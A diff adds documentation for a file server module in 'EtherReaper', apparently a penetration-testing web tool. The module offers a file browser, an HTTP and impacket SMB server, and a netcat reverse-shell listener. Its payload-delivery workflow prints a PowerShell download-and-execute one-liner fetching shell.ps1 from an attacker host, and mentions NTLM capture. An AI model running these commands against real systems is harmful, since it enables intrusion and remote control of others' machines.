@@ -1,0 +1,268 @@
+---
+title: File server
+description: Built-in HTTP server, SMB server (impacket-smbserver), netcat listener, and file browser for delivering payloads and catching reverse shells.
+---
+
+EtherReaper includes a set of integrated file delivery and shell-catching tools accessible from the **TOOLS → File Server** section. These tools let you serve files to target machines, host an SMB share, and catch reverse shell connections — all without leaving the browser.
+
+## File browser
+
+A full filesystem browser lets you navigate, upload, download, and delete files directly from the browser.
+
+### GET /api/files/list
+
+List directory contents.
+
+```bash
+curl "http://localhost:8000/api/files/list?path=/home/user"
+```
+
+**Response**
+
+```json
+{
+  "path": "/home/user",
+  "parent": "/home",
+  "entries": [
+    {
+      "name": "exploit.py",
+      "path": "/home/user/exploit.py",
+      "is_dir": false,
+      "is_symlink": false,
+      "size": 4096,
+      "modified": "2024-01-15 14:32"
+    }
+  ]
+}
+```
+
+### GET /api/files/mounts
+
+List available filesystem mount points (read from `/proc/mounts`). Used by the UI to populate the mount dropdown.
+
+### POST /api/files/upload
+
+Upload a file to a directory.
+
+```bash
+curl -X POST http://localhost:8000/api/files/upload \
+  -F "path=/home/user/payloads" \
+  -F "file=@/local/path/exploit.py"
+```
+
+### GET /api/files/download
+
+Download a file by absolute path.
+
+```bash
+curl "http://localhost:8000/api/files/download?path=/home/user/exploit.py" -o exploit.py
+```
+
+### DELETE /api/files/delete
+
+Delete a file or directory (recursive for directories).
+
+```bash
+curl -X DELETE "http://localhost:8000/api/files/delete?path=/home/user/old_file.txt"
+```
+
+### POST /api/files/mkdir
+
+Create a directory.
+
+```bash
+curl -X POST http://localhost:8000/api/files/mkdir \
+  -H "Content-Type: application/json" \
+  -d '{"path": "/home/user/payloads"}'
+```
+
+---
+
+## HTTP server
+
+Serves files over HTTP using Python's built-in `http.server` module (`python3 -m http.server`). Use this to deliver payloads, tools, or scripts to target machines.
+
+### POST /api/httpserver/start
+
+```bash
+curl -X POST http://localhost:8000/api/httpserver/start \
+  -H "Content-Type: application/json" \
+  -d '{"port": "8080", "directory": "/home/user/payloads"}'
+```
+
+| Field | Default | Description |
+|---|---|---|
+| `port` | `8080` | TCP port to listen on |
+| `directory` | `~` | Directory to serve |
+
+**Response**
+
+```json
+{
+  "status": "success",
+  "port": "8080",
+  "directory": "/home/user/payloads",
+  "output_file": "httpserver.log"
+}
+```
+
+### POST /api/httpserver/stop
+
+Terminates the HTTP server process.
+
+### GET /api/httpserver/status
+
+```json
+{
+  "running": true,
+  "port": "8080",
+  "directory": "/home/user/payloads",
+  "output_file": "httpserver.log"
+}
+```
+
+### GET /api/httpserver/output
+
+Stream server logs (access log output) incrementally.
+
+```bash
+curl "http://localhost:8000/api/httpserver/output?offset=0"
+```
+
+---
+
+## SMB server
+
+Hosts an SMB share using `impacket-smbserver` with SMBv2 support. Useful for delivering payloads to Windows targets or catching NTLM authentication.
+
+### POST /api/smbserver/start
+
+```bash
+curl -X POST http://localhost:8000/api/smbserver/start \
+  -H "Content-Type: application/json" \
+  -d '{
+    "share_name": "tools",
+    "share_path": "/home/user/payloads",
+    "username": "guest",
+    "password": ""
+  }'
+```
+
+| Field | Default | Description |
+|---|---|---|
+| `share_name` | `share` | SMB share name (e.g. `\\attacker\tools`) |
+| `share_path` | `~` | Local directory to expose |
+| `username` | `` | Optional authentication username |
+| `password` | `` | Optional authentication password |
+
+The server runs with `-smb2support` so modern Windows clients can connect. Leave `username`/`password` empty to allow unauthenticated access.
+
+**Response**
+
+```json
+{"status": "success", "output_file": "smbserver.log"}
+```
+
+### POST /api/smbserver/stop
+
+Terminates the SMB server process (via `SIGTERM` to the process group).
+
+### GET /api/smbserver/status
+
+```json
+{
+  "running": true,
+  "share_name": "tools",
+  "share_path": "/home/user/payloads",
+  "output_file": "smbserver.log"
+}
+```
+
+### GET /api/smbserver/output
+
+Stream server connection logs incrementally.
+
+---
+
+## Netcat listener
+
+Starts a `nc -lvnp <port>` listener to catch reverse shell connections. The listener output is streamed live in the browser and also available via a WebSocket for interactive shell use.
+
+### POST /api/listener/start
+
+```bash
+curl -X POST http://localhost:8000/api/listener/start \
+  -H "Content-Type: application/json" \
+  -d '{"port": "4444"}'
+```
+
+| Field | Default | Description |
+|---|---|---|
+| `port` | `4444` | TCP port to listen on |
+
+**Response**
+
+```json
+{
+  "status": "success",
+  "port": "4444",
+  "output_file": "listener_20240115_143200.txt"
+}
+```
+
+### POST /api/listener/stop
+
+Terminates the netcat listener.
+
+### GET /api/listener/status
+
+```json
+{
+  "running": true,
+  "port": "4444",
+  "output_file": "listener_20240115_143200.txt"
+}
+```
+
+### GET /api/listener/output
+
+Read listener output incrementally (from in-memory buffer).
+
+```bash
+curl "http://localhost:8000/api/listener/output?offset=0"
+```
+
+### WebSocket: /ws/listener
+
+Interactive WebSocket connection to the listener process. Proxies I/O bidirectionally between the browser and the ncat process stdin/stdout — enabling interactive shell sessions directly in the browser.
+
+---
+
+## Typical payload delivery workflow
+
+<Steps>
+  <Step title="Start the HTTP server">
+    Open **TOOLS → File Server → HTTP Server**. Set the directory containing your payloads (e.g. `/home/user/payloads`). Click **Start**.
+  </Step>
+  <Step title="Start the listener">
+    Open the **Listener** tab. Set the port your reverse shell will connect back to (e.g. 4444). Click **Start**.
+  </Step>
+  <Step title="Execute payload on target">
+    From your shell access or exploit, trigger the payload download and execution:
+    ```powershell
+    # PowerShell download and execute
+    IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.1:8080/shell.ps1')
+    ```
+    Or via SMB:
+    ```cmd
+    \\10.10.14.1\tools\shell.exe
+    ```
+  </Step>
+  <Step title="Catch the shell">
+    The listener output panel displays the incoming connection. Use the WebSocket terminal for interactive commands.
+  </Step>
+</Steps>
+
+<Tip>
+  The SMB server automatically logs every connection attempt including the client IP and authentication details. These logs are useful for confirming that NTLM relay or MasterBaiter payloads have triggered on a target machine.
+</Tip>
